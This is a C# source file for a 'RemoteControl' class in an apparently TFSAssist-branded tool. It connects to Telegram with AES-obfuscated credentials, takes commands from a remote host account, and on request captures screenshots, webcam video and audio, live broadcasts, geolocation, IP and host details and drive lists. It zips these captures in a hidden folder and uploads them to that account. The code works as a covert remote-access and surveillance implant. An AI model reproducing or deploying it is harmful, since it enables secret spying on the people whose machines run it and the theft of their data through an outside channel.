using System;
using System.Collections.Generic;
using System.Device.Location;
using System.Diagnostics;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.IO.Compression;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Threading.Tasks;
using Microsoft.Win32;
using TeleSharp.TL;
using Utils;
using Utils.AppUpdater;
using Utils.Handles;
using Utils.Telegram;
using Utils.WinForm.MediaCapture;

namespace TFSAssist.Remoter
{
    public class RemoteControl : IDisposable
    {
        public Thread MainThread { get; }

        private readonly string ClientID;
        private TTLControl _control;
        private readonly StringBuilder _processingErrorLogs;

        private AForgeMediaDevices _aforgeDevices = null;
        private EncoderMediaDevices _encDevices = null;
        private AForgeCapture _aforgeCapture;
        private EncoderCapture _encoderCapture;

        private GeoCoordinateWatcher _watcher;
        private string _locationResult = string.Empty;
        private bool _tryGetLocation = false;

        //private readonly Action _checkUpdates;
        //private readonly Action _restartApplication;
        //private readonly Func<string> _getLogs;
        private readonly Func<string, string> _callParent;

        private string _tempDir = string.Empty;

        public string TempDirectory
        {
            get
            {
                if (!Directory.Exists(_tempDir))
                    CreateDirectory(_tempDir).Wait();
                return _tempDir;
            }
            private set => _tempDir = value;
        }

        // PRIVATE DATA!!!
        private const string KEY = nameof(TLControl);
        // PRIVATE DATA!!!

        private static string HashCodeFilePath => Path.Combine(ASSEMBLY.ApplicationDirectory, TLControl.SessionName + ".hash");
        private static string AuthCodeFilePath => Path.Combine(ASSEMBLY.ApplicationDirectory, TLControl.SessionName + ".code");

        public bool IsEnabled { get; private set; } = false;

        private Dictionary<string, RemoteControlCommands> AllCommands { get; } = new Dictionary<string, RemoteControlCommands>(StringComparer.CurrentCultureIgnoreCase);

        public RemoteControl(Thread mainThread, string clientId, Func<string, string> callParentFunctions)
        {
            MainThread = mainThread;
            ClientID = clientId;

            _processingErrorLogs = new StringBuilder();
            _callParent = callParentFunctions;

            
            TempDirectory = Path.Combine(ASSEMBLY.ApplicationDirectory, "Temp");

            foreach (RemoteControlCommands command in Enum.GetValues(typeof(RemoteControlCommands)))
            {
                AllCommands.Add(command.ToString("G"), command);
            }
        }

        public async Task<bool> Initialize()
        {
            InitGeoWatcher();
            await InitTempDirectory(TempDirectory);
            await InitTempSession();

            InitCamCapture(TempDirectory); // только после InitTempDirectory

            await Connect(GetAuthCode);

            if (IsEnabled)
            {
                await Task.Delay(5000);
                SendMessageToUserHost($"Connected. {GetCurrentServerInfo()}");
                await Task.Delay(1000);
            }

            return IsEnabled;
        }

        async Task Connect(Func<Task<string>> getAuthCode)
        {
            tryConnect:

            try
            {
                IsEnabled = false;

                _control?.Dispose();
                _control = new TTLControl(int.Parse(Utils.Crypto.AES.DecryptStringAES("EAAAANgw9/AN5XtERxX5Rjl1v2dxWpc1kbN7Pz8zMSNvduOj", KEY)), Utils.Crypto.AES.DecryptStringAES("EAAAAKUDZalqO6zA+3GkNaXYWGjBAIKeXdCshPO6fuf2tL4xIt7gaXd49TZY3isKaXi3lECRYUynr/qZQl0WDiHeYfg=", KEY));
                await _control.ConnectAsync();

                IsEnabled = true;
            }
            catch (AuthorizationException ex)
            {
                if (getAuthCode != null && _control != null)
                {
                    try
                    {
                        string hash;
                        string code;
                        string phone_number = Utils.Crypto.AES.DecryptStringAES("EAAAAPVCk/v9pGIyjaouvJTkkvBJMYMHxz3Nh8r3Q+oQAel+", KEY);

                        // если уже существуют файл с хэшом
                        if (File.Exists(HashCodeFilePath))
                        {
                            hash = await DecryptFileData(HashCodeFilePath); // раскодировать хэш

                            if (File.Exists(AuthCodeFilePath)) // если уже существуют файл c полученным кодом, то забираем код
                                code = await DecryptFileData(AuthCodeFilePath); // раскодировать код
                            else // если файла с кодом еще нет, то будем ждать появления кода по текущему хэшу
                                code = await getAuthCode.Invoke();
                        }
                        else
                        {
                            hash = await _control.SendCodeRequestAsync(phone_number);
                            var cryptHash = Utils.Crypto.AES.EncryptStringAES(hash, KEY); // закодировать хэш
                            await SaveFile(HashCodeFilePath,
                                cryptHash); // созраняем файл с хэшом, т.к. если перезагрузится приложение в то время как будем ждать код - хэш потеряется и мы отправим запрос на получение нового кода по новому хэшу. Поэтому заново запрашивать код нельзя
                            code = await getAuthCode.Invoke(); // ждем появления файла с кодом
                        }

                        // если успешно получили файл с кодом, то можно удалять файл с хэшом и файл с кодом, т.к. они больше не пригодятся
                        File.Delete(HashCodeFilePath);
                        File.Delete(AuthCodeFilePath);

                        await _control.MakeAuthAsync(phone_number, hash, code);

                        //await _control.AuthUserAsync(getAuthUserCode, "+375333866536");
                        await Connect(null); // не передаем метод по получению кода, т.к. что то было сделанно не корреткно и может произойти FloodException, что не желательно
                    }
                    catch (Exception ex2)
                    {
                        WriteExLog(ex2, false);
                    }

                    return;
                }

                WriteExLog(ex, false);
            }
            catch (SocketException ex)
            {
                // если нет соединения с интернетом, пытаемся реконнектиться
                if (ex.SocketErrorCode == SocketError.HostUnreachable || ex.SocketErrorCode == SocketError.TimedOut)
                {
                    await Task.Delay(60000);
                    goto tryConnect;
                }
            }
            catch (Exception)
            {
                throw;
            }
        }

        async Task<string> GetAuthCode()
        {
            // ждем когда появится локальный файл с кодом для новой авторизации
            string result = string.Empty;

            try
            {
                while (!File.Exists(AuthCodeFilePath))
                {
                    await Task.Delay(5000);
                }

                result = await DecryptFileData(AuthCodeFilePath); // раскодировать файл с кодом авторизации
            }
            catch (Exception)
            {
                // null
            }

            return result;
        }

        /// <summary>
        /// Раскодировать
        /// </summary>
        /// <param name="fileDestination"></param>
        /// <returns></returns>
        async Task<string> DecryptFileData(string fileDestination)
        {
            string result;
            using (var stream = new StreamReader(fileDestination))
            {
                var res = await stream.ReadToEndAsync();
                result = Utils.Crypto.AES.DecryptStringAES(res, KEY);
            }

            return result;
        }


        private readonly object syncSession = new object();

        public async Task Run()
        {
            DateTime lastDate = DateTime.Now;

            while (IsEnabled)
            {
                try
                {
                    //List<TLMessage> newMessages = await _control.GetDifference(_control.CurrentUser.User, _control.CurrentUser.Destination, lastDate);
                    List<TLMessage> newMessages = null;
                    lock (syncSession)
                    {
                        Task<List<TLMessage>> task = _control.GetDifference(_control.UserHost.User, _control.UserHost.Destination, lastDate);
                        task.Wait();

                        newMessages = task.Result;
                    }

                    TLMessage lastMessage = newMessages?.LastOrDefault();
                    if (lastMessage != null)
                    {
                        await ReadCommands(newMessages, TempDirectory);
                        lastDate = TLControl.ToDate(lastMessage.Date);
                    }
                }
                catch (Exception ex)
                {
                    bool isReconnected = false;
                    lock (syncSession)
                    {
                        if (!_control.IsConnected)
                        {
                            Task task = Connect(GetAuthCode);
                            task.Wait();
                            isReconnected = true;
                        }
                    }

                    if (isReconnected)
                        SendMessageToUserHost($"Reconnected. {GetCurrentServerInfo()}");
                    else
                        WriteExLog(ex);
                }

                await Task.Delay(5000);
            }
        }

        public void SendMessage(string message)
        {
            SendMessageToUserHost(message);
        }

        void SendMessageToUserHost(string message)
        {
            if (!IsEnabled)
                return;

            try
            {
                //await _control.SendMessageAsync(_control.CurrentUser.Destination, $"CID=[{ClientID}]\r\n{message.Trim()}", 0);
                lock (syncSession)
                {
                    Task task = _control.SendMessageAsync(_control.UserHost.Destination, $"CID=[{ClientID}]\r\n{message.Trim()}", 0);
                    task.Wait();
                }
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
        }

        void SendZipFileToUserHost(string destinationPath)
        {
            if (!IsEnabled)
                return;

            try
            {
                //await _control.SendBigFileAsync(_control.CurrentUser.Destination, destinationPath);
                lock (syncSession)
                {
                    string destinationZip = DoZipFile(destinationPath);
                    if (destinationZip != null && File.Exists(destinationZip))
                    {
                        Task task = _control.SendBigFileAsync(_control.UserHost.Destination, destinationZip);
                        task.Wait(); // таймаут ставить нельзя т.к. может интеренет тормознутый и надо дождаться до конца

                        File.Delete(destinationZip);
                    }
                }
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
            finally
            {
                // очищаем память, т.к. отправили большой файл
                GC.Collect();
            }
        }

        async Task ReadCommands(List<TLMessage> newMessages, string projectDirPath)
        {
            bool isUpdate = false;
            bool isRestart = false;
            string isCommand = ClientID + ":";

            try
            {
                foreach (var tl_message in newMessages)
                {
                    if (tl_message.Message.StartsWith(isCommand, StringComparison.CurrentCultureIgnoreCase))
                    {
                        string strCommand = tl_message.Message.Substring(isCommand.Length, tl_message.Message.Length - isCommand.Length);
                        Dictionary<string, string> options = null;
                        int optStart = strCommand.IndexOf('(');
                        int optEnd = strCommand.IndexOf(')');
                        if (optStart != -1 && optEnd != -1 && optEnd > optStart)
                        {
                            string strOptions = strCommand.Substring(optStart, strCommand.Length - optStart);
                            options = ReadOptionParams(strOptions);
                            strCommand = strCommand.Substring(0, optStart);
                        }
                        strCommand = strCommand.Trim();

                        if (!AllCommands.TryGetValue(strCommand, out var command))
                            continue;

                        switch (command)
                        {
                            case RemoteControlCommands.PING:
                                SendMessageToUserHost("PONG. " + GetCurrentServerInfo());
                                break;

                            case RemoteControlCommands.COMMANDS:
                                SendMessageToUserHost(string.Join("\r\n", Enum.GetNames(typeof(RemoteControlCommands))));
                                break;

                            case RemoteControlCommands.INFO:
                                StringBuilder detInfo = new StringBuilder();

                                var hostIps = HOST.GetIPAddresses();
                                int maxLenghtSpace = hostIps.Aggregate("", (max, cur) => max.Length > cur.Interface.Name.Length ? max : cur.Interface.Name).Length + 3;

                                foreach (var address in hostIps)
                                {
                                    detInfo.Append($"{address.Interface.Name} {new string('.', maxLenghtSpace - address.Interface.Name.Length)} [{address.IPAddress.Address.ToString()}] ({address.Interface.Description})\r\n");
                                }

                                string whiteSpace = "=";
                                if (maxLenghtSpace > 10)
                                    whiteSpace = " " + new string('.', maxLenghtSpace - 10) + " ";

                                detInfo.Append($"ExternalIP{whiteSpace}[{HOST.GetExternalIPAddress()}]\r\n");


                                var det = HOST.GetDetailedHostInfo();
                                if (det?.Count > 0)
                                {
                                    detInfo.Append($"\r\nDetailed:\r\n");
                                    maxLenghtSpace = det.Keys.Aggregate("", (max, cur) => max.Length > cur.Length ? max : cur).Length + 3;

                                    foreach (var value in det)
                                    {
                                        detInfo.Append($"{value.Key} {new string('.', maxLenghtSpace - value.Key.Length)} [{string.Join("];[", value.Value)}]\r\n");
                                    }

                                    // должен быть именно GetEntryAssembly вместо GetExecutingAssembly. Т.к. GetExecutingAssembly смотрит исполняемую библиотеку, а не испольняемый exe файл
                                    Dictionary<string, FileBuildInfo> localVersions = BuildPackInfo.GetLocalVersions(Assembly.GetEntryAssembly());
                                    if (localVersions?.Count > 0)
                                    {
                                        maxLenghtSpace = localVersions.Keys.Aggregate("", (max, cur) => max.Length > cur.Length ? max : cur).Length + 3;
                                        localVersions = localVersions.OrderBy(p => p.Key).ToDictionary(x => x.Key, x => x.Value);

                                        detInfo.Append($"\r\nLocation=[{Assembly.GetEntryAssembly().GetDirectory()}]\r\n");
                                        foreach (var versionLocalFiles in localVersions)
                                        {
                                            detInfo.Append($"{versionLocalFiles.Key} {new string('.', maxLenghtSpace - versionLocalFiles.Key.Length)} [{versionLocalFiles.Value.Version}]\r\n");
                                        }
                                    }

                                    await SaveFile(Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.log"), detInfo.ToString());
                                }
                                break;

                            case RemoteControlCommands.DRIVE:
                                var drives = DriveInfo.GetDrives();
                                if (drives == null || drives.Length == 0)
                                    break;

                                string result = string.Empty;
                                foreach (DriveInfo drive in drives)
                                {
                                    if (drive.IsReady)
                                    {
                                        result += $"Drive=[{drive.Name}] TotalSize=[{IO.FormatBytes(drive.TotalSize, out _)}] FreeSize=[{IO.FormatBytes(drive.TotalFreeSpace, out _)}]\r\n";
                                    }
                                }

                                SendMessageToUserHost(result);
                                break;

                            case RemoteControlCommands.SCREEN:

                                string imagePath = Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.png");
                                await ScreenCapture.CaptureAsync(imagePath, ImageFormat.Png);
                                break;

                            case RemoteControlCommands.CPU:
                                Process proc = Process.GetCurrentProcess();

                                var totalCPU = (int)SERVER.GetCpuUsage();
                                var totalMem = SERVER.GetTotalMemoryInMiB();
                                var avalMem = SERVER.GetPhysicalAvailableMemoryInMiB();

                                var appCPUUsage = (int)SERVER.GetCpuUsage(proc);
                                string appMemUsage = SERVER.GetMemUsage(proc).ToFileSize();

                                SendMessageToUserHost($"CPU=[{appCPUUsage}%] Mem=[{appMemUsage}] TotalCPU=[{totalCPU}%] TotalMem=[{totalMem} MB] FreeMem=[{avalMem} MB]");

                                break;

                            case RemoteControlCommands.LOC:
                                if (_locationResult.IsNullOrEmptyTrim())
                                {
                                    SendMessageToUserHost("Location unknown.");
                                    _tryGetLocation = true;
                                }
                                else
                                {
                                    SendMessageToUserHost(_locationResult);
                                    _tryGetLocation = false;
                                }
                                break;

                            case RemoteControlCommands.CAMINFO:
                                string currentDevices = string.Empty;
                                string resultCamInfo = string.Empty;
                                if (_aforgeDevices != null)
                                {
                                    if (_aforgeCapture != null)
                                        currentDevices = $"AForge:\r\n{_aforgeCapture.ToString()}";
                                    resultCamInfo = _aforgeDevices.ToString();
                                }

                                if (_encDevices != null)
                                {
                                    if (_encoderCapture != null)
                                        currentDevices = currentDevices + $"\r\nEncoder:\r\n{_encoderCapture.ToString()}";
                                    resultCamInfo = resultCamInfo + "\r\n\r\n" + _encDevices.ToString();
                                }

                                resultCamInfo = resultCamInfo.Trim();

                                if (resultCamInfo.IsNullOrEmptyTrim())
                                    SendMessageToUserHost("No device found.");
                                else
                                    SendMessageToUserHost(currentDevices.Trim() + "\r\n===================\r\n" + resultCamInfo);
                                break;

                            case RemoteControlCommands.CAMSETT:
                                int exceptionCount = 0;
                                if (options != null && options.Count > 0)
                                {
                                    if (options.TryGetValue("Seconds", out var timeRecStr))
                                    {
                                        if (int.TryParse(timeRecStr, out var timeRec))
                                        {
                                            if (_aforgeCapture != null)
                                                _aforgeCapture.SecondsRecordDuration = timeRec;
                                            if (_encoderCapture != null)
                                                _encoderCapture.SecondsRecordDuration = timeRec;
                                        }
                                    }

                                    if (options.TryGetValue("Video", out var video))
                                    {
                                        try
                                        {
                                            _aforgeCapture?.ChangeVideoDevice(video);
                                        }
                                        catch (Exception ex)
                                        {
                                            exceptionCount++;
                                            WriteExLog($"{ex.GetType()}=[{ex.Message}]");
                                        }

                                        try
                                        {
                                            _encoderCapture?.ChangeVideoDevice(video);
                                        }
                                        catch (Exception ex)
                                        {
                                            exceptionCount++;
                                            WriteExLog($"{ex.GetType()}=[{ex.Message}]");
                                        }
                                    }

                                    if (options.TryGetValue("Audio", out var audio))
                                    {
                                        try
                                        {
                                            _encoderCapture?.ChangeAudioDevice(audio);
                                        }
                                        catch (Exception ex)
                                        {
                                            exceptionCount++;
                                            WriteExLog($"{ex.GetType()}=[{ex.Message}]");
                                        }
                                    }

                                    if (exceptionCount > 0)
                                        SendMessageToUserHost($"Errors=[{exceptionCount}]");
                                }

                                break;

                            case RemoteControlCommands.ACAM:
                                _aforgeCapture?.StartCamRecording();
                                break;

                            case RemoteControlCommands.ECAM:
                                _encoderCapture?.StartCamRecording();
                                break;

                            case RemoteControlCommands.BROADCAST:
                                if (_encoderCapture == null)
                                    break;

                                if (options != null && options.Count > 0)
                                {
                                    if (options.TryGetValue("Port", out var portStr))
                                    {
                                        if (int.TryParse(portStr, out var port))
                                        {
                                            _encoderCapture.StartBroadcast(port);
                                            break;
                                        }
                                    }
                                }

                                _encoderCapture.StartBroadcast();
                                break;

                            case RemoteControlCommands.STOPCAM:
                                _aforgeCapture?.Stop();
                                _encoderCapture?.Stop();
                                break;

                            case RemoteControlCommands.PHOTO:
                                if (_aforgeCapture == null)
                                    break;

                                Task<Bitmap> task = _aforgeCapture.GetPictureAsync();
                                if (task.Wait(20000))
                                {
                                    var photo = task.Result;
                                    if (photo != null)
                                    {
                                        string photoPath = Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.png");
                                        photo.Save(photoPath, ImageFormat.Png);
                                    }
                                }
                                break;

                            //case RemoteControlCommands.KILL:
                            //    Terminate();
                            //    break;

                            case RemoteControlCommands.LOG:
                                string entireLogs = _callParent?.Invoke(RemoteControlCommands.LOG.ToString("G"));
                                string currentLogs = GetCurrentProcessingLogs();

                                if (entireLogs.IsNullOrEmpty())
                                {
                                    entireLogs = currentLogs;
                                }
                                else if (!currentLogs.IsNullOrEmpty())
                                {
                                    entireLogs = $"{entireLogs}\r\n\r\n{new string('=', 15)}\r\n\r\n{currentLogs}";
                                }

                                if (entireLogs.IsNullOrEmptyTrim())
                                {
                                    SendMessageToUserHost("Log is empty.");
                                    break;
                                }
                                else if (entireLogs.Length <= 800) // если логов немного
                                {
                                    SendMessageToUserHost(entireLogs);
                                    break;
                                }

                                await SaveFile(Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.log"), entireLogs);
                                break;

                            case RemoteControlCommands.UPDATE:
                                isUpdate = true;
                                break;

                            case RemoteControlCommands.RESTART:
                                isRestart = true;
                                break;

                            default:
                                string parentResult = _callParent?.Invoke(command.ToString("G"));
                                if (!parentResult.IsNullOrEmptyTrim())
                                {
                                    if(parentResult.Length <= 800)
                                        SendMessageToUserHost(parentResult);
                                    else
                                        await SaveFile(Path.Combine(projectDirPath, $"{STRING.RandomString(15)}.log"), parentResult);
                                }
                                break;
                        }
                    }
                    else
                    {
                        if (!AllCommands.TryGetValue(tl_message.Message, out var command))
                            continue;

                        switch (command)
                        {
                            case RemoteControlCommands.PING:
                                SendMessageToUserHost("PONG. " + GetCurrentServerInfo());
                                break;
                            
                            case RemoteControlCommands.UPDATE:
                                isUpdate = true;
                                break;

                            case RemoteControlCommands.RESTART:
                                isRestart = true;
                                break;
                        }
                    }
                }
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
            finally
            {
                SendPreparedFiles(projectDirPath);

                // выполняется всегда в конце после обработки других комманд, если они были
                try
                {
                    if (isUpdate)
                    {
                        _callParent?.Invoke(RemoteControlCommands.UPDATE.ToString("G"));
                    }
                    else if (isRestart)
                    {
                        _callParent?.Invoke(RemoteControlCommands.RESTART.ToString("G"));
                    }
                }
                catch (Exception ex)
                {
                    WriteExLog(ex);
                }
            }
        }

        private object syncSendingFiles = new object();

        void SendPreparedFiles(string projectDirPath)
        {
            var tempFiles = Directory.EnumerateFiles(projectDirPath, "*", SearchOption.AllDirectories);

            if (tempFiles.Any())
            {
                try
                {
                    SendZipFileToUserHost(projectDirPath);
                }
                catch (Exception ex)
                {
                    GC.Collect();
                    WriteExLog(ex);
                }
            }

            DeleteAllFilesInDirectory(projectDirPath);
        }



        static Dictionary<string, string> ReadOptionParams(string options)
        {
            Dictionary<string, string> optParams = new Dictionary<string, string>(StringComparer.CurrentCultureIgnoreCase);
            StringBuilder builderParam = new StringBuilder();
            StringBuilder builderValue = new StringBuilder();
            int findParams = 0;
            int findValue = 0;

            foreach (char ch in options)
            {
                if (ch == '(' && findParams == 0)
                {
                    findParams++;
                    continue;
                }

                if (ch == ')' && (findValue == 0 || findValue == 3) && findParams > 0)
                {
                    findParams--;
                    continue;
                }

                if (findParams <= 0)
                    continue;

                if ((ch == '=' && findValue == 0) || (ch == '\'' && findValue >= 1))
                {
                    findValue++;
                    continue;
                }

                if (ch == ',' && findValue == 3)
                {
                    findValue = 0;
                    optParams.Add(builderParam.ToString(), builderValue.ToString());
                    builderParam.Clear();
                    builderValue.Clear();
                    continue;
                }

                if (findValue == 2)
                {
                    builderValue.Append(ch);
                    continue;
                }

                if (!char.IsWhiteSpace(ch) && findValue == 0)
                    builderParam.Append(ch);
            }

            optParams.Add(builderParam.ToString(), builderValue.ToString());
            builderParam.Clear();
            builderValue.Clear();

            return optParams;
        }

        static async Task SaveFile(string destination, string data)
        {
            using (var stream = new FileStream(destination, FileMode.OpenOrCreate))
            {
                byte[] logsBytes = new UTF8Encoding(true).GetBytes(data.Trim());
                await stream.WriteAsync(logsBytes, 0, logsBytes.Length);
            }
        }

        string DoZipFile(string sourceDir)
        {
            try
            {
                DirectoryInfo d = new DirectoryInfo(sourceDir);
                FileInfo[] Files = d.GetFiles("*", SearchOption.AllDirectories);
                if (!Files.Any())
                    return null;

                string destinationZip = Path.Combine(sourceDir, STRING.RandomStringNumbers(15) + ".zip");
                string packFileTempPath = Path.GetTempFileName();
                File.Delete(packFileTempPath);

                int filesInArchive = 0;
                using (FileStream zipToOpen = new FileStream(packFileTempPath, FileMode.OpenOrCreate))
                {
                    using (ZipArchive archive = new ZipArchive(zipToOpen, ZipArchiveMode.Create))
                    {
                        foreach (FileInfo file in Files)
                        {
                            if (IO.IsFileReady(file.FullName))
                            {
                                string destArchPth = file.FullName.Replace(sourceDir, "").Trim('\\');
                                archive.CreateEntryFromFile(file.FullName, destArchPth);
                                filesInArchive++;
                            }
                        }
                    }
                }

                if (filesInArchive == 0)
                {
                    if (File.Exists(packFileTempPath))
                        File.Delete(packFileTempPath);
                    return null;
                }

                //ZipFile.CreateFromDirectory(sourceDir, packFileTempPath, CompressionLevel.Optimal, false);

                File.Copy(packFileTempPath, destinationZip, true);
                File.Delete(packFileTempPath);
                return destinationZip;
            }
            catch (Exception)
            {
                return null;
            }
        }

        string GetCurrentServerInfo()
        {
            try
            {
                return $"Host=[{Dns.GetHostName()}] Thread=[{(MainThread.IsAlive ? MainThread.ManagedThreadId.ToString() : "Aborted")}]";
            }
            catch (Exception)
            {
                return string.Empty;
            }
        }


        void InitGeoWatcher()
        {
            try
            {
                _watcher = new GeoCoordinateWatcher();
                _watcher.StatusChanged += Watcher_StatusChanged;
                _watcher.Start();
            }
            catch (Exception ex)
            {
                WriteExLog(ex, false);
            }
        }

        private void Watcher_StatusChanged(object sender, GeoPositionStatusChangedEventArgs e)
        {
            if (e.Status != GeoPositionStatus.Ready)
                return;

            if (_watcher.Position.Location.IsUnknown)
                return;

            GeoCoordinate coordinate = _watcher.Position.Location;
            _locationResult = $"Latitude=[{coordinate.Latitude.ToString().Replace(",", ".")}] Longitude=[{coordinate.Longitude.ToString().Replace(",", ".")}]";

            if (_tryGetLocation)
            {
                SendMessageToUserHost(_locationResult);
                _tryGetLocation = false;
            }
        }





        async Task InitTempSession()
        {
            try
            {
                string tempSession = TLControl.SessionName + ".tmp";

                if (!File.Exists(tempSession))
                    return;

                using (var stream = new FileStream(tempSession, FileMode.Open))
                {
                    var buffer = new byte[2048];
                    await stream.ReadAsync(buffer, 0, 2048);
                    using (RegeditControl regedit = new RegeditControl(ASSEMBLY.ApplicationName))
                    {
                        regedit[TLControl.SessionName, RegistryValueKind.Binary] = buffer;
                    }
                }

                File.Delete(tempSession);
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
        }

        async Task InitTempDirectory(string tempDirPath)
        {
            var di = new DirectoryInfo(tempDirPath);

            if (di.Exists)
            {
                try
                {
                    //await IO.DeleteReadOnlyDirectoryAsync(dirPath);

                    DeleteAllFilesInDirectory(tempDirPath);
                    di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;

                }
                catch (Exception ex)
                {
                    WriteExLog(ex, false);
                }
            }
            else
            {
                await CreateDirectory(tempDirPath);
            }
        }

        void DeleteAllFilesInDirectory(string dirPath)
        {
            try
            {
                var tempFiles = Directory.EnumerateFiles(dirPath, "*", SearchOption.AllDirectories);
                foreach (var fileName in tempFiles)
                {
                    if (!IO.IsFileReady(fileName))
                        continue;

                    var fileInfo = new FileInfo(fileName)
                    {
                        Attributes = FileAttributes.Normal
                    };
                    fileInfo.Delete();
                }

                foreach (DirectoryInfo dir in new DirectoryInfo(dirPath).GetDirectories())
                {
                    dir.Delete(true);
                }
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
        }

        async Task CreateDirectory(string dirPath)
        {
            int attempts = 0;

            tryCreateDir:
            try
            {
                DirectoryInfo di = Directory.CreateDirectory(dirPath);
                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
            }
            catch (Exception ex)
            {
                WriteExLog(ex, false);
                attempts++;
                if (attempts < 5)
                {
                    await Task.Delay(1000);
                    goto tryCreateDir;
                }
            }
        }

        void InitCamCapture(string projectDirPath)
        {
            try
            {
                _aforgeDevices = new AForgeMediaDevices();
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }

            try
            {
                _encDevices = new EncoderMediaDevices();
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }

            try
            {
                _aforgeCapture = new AForgeCapture(MainThread, _aforgeDevices, _encDevices, projectDirPath, 10);
                _aforgeCapture.OnRecordingCompleted += OnRecordingCompleted;
                _aforgeCapture.OnUnexpectedError += OnUnexpectedError;
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }

            try
            {
                _encoderCapture = new EncoderCapture(MainThread, _aforgeDevices, _encDevices, projectDirPath, 60);
                _encoderCapture.OnRecordingCompleted += OnRecordingCompleted;
            }
            catch (Exception ex)
            {
                WriteExLog(ex);
            }
        }

        private void OnUnexpectedError(object sender, MediaCaptureEventArgs args)
        {
            WriteExLog($"AForge Unexpected Error=[{args?.Error?.ToString()}]");
        }

        private async void OnRecordingCompleted(object sender, MediaCaptureEventArgs args)
        {
            if (args == null)
                return;
            if (args.Error != null)
                WriteExLog(args.Error);

            if (string.IsNullOrWhiteSpace(args.DestinationFile) || !File.Exists(args.DestinationFile))
                return;

            int tryCount = 0;
            while (!IO.IsFileReady(args.DestinationFile))
            {
                if (tryCount >= 5)
                    return;

                await Task.Delay(1000);
                tryCount++;
            }

            if (sender is IMediaCapture mediaCapture)
            {
                SendPreparedFiles(mediaCapture.DestinationDir);
            }
            else
            {
                WriteExLog($"Sender is not [{nameof(IMediaCapture)}] when recording completed.");
            }
        }

        #region LOGS

        readonly object syncLog = new object();

        void WriteExLog(Exception ex, bool isDebug = true)
        {
            WriteExLog(ex?.ToString(), isDebug);
        }

        void WriteExLog(string message, bool isDebug = true)
        {
            //_writeLog?.Invoke(isDebug ? WarnSeverity.Debug : WarnSeverity.Error, $"{nameof(TFSA_TLControl)}=[{ex.Message}]\r\n{ex.StackTrace}");
            //_writeLogs?.Invoke(isDebug ? WarnSeverity.Debug : WarnSeverity.Error, $"{nameof(RemoteControl)}=[{message}]");
            string isDebugStr = isDebug ? "DEBUG" : "ERROR";
            lock (syncLog)
                _processingErrorLogs.Append($"[{isDebugStr}]:[{DateTime.Now:G}]={message}\r\n");
        }

        string GetCurrentProcessingLogs()
        {
            string pullLogs;

            lock (syncLog)
            {
                pullLogs = _processingErrorLogs.ToString().Trim();
                _processingErrorLogs.Clear();
            }

            return pullLogs;
        }

        #endregion



        public void Dispose()
        {
            Terminate();
        }

        void Terminate()
        {
            try
            {
                IsEnabled = false;
                lock (syncSession)
                {
                    _control?.Dispose();
                }
                _watcher?.Stop();
                DeleteAllFilesInDirectory(TempDirectory);
            }
            catch (Exception)
            {
                // ignored
            }
        }
    }
}
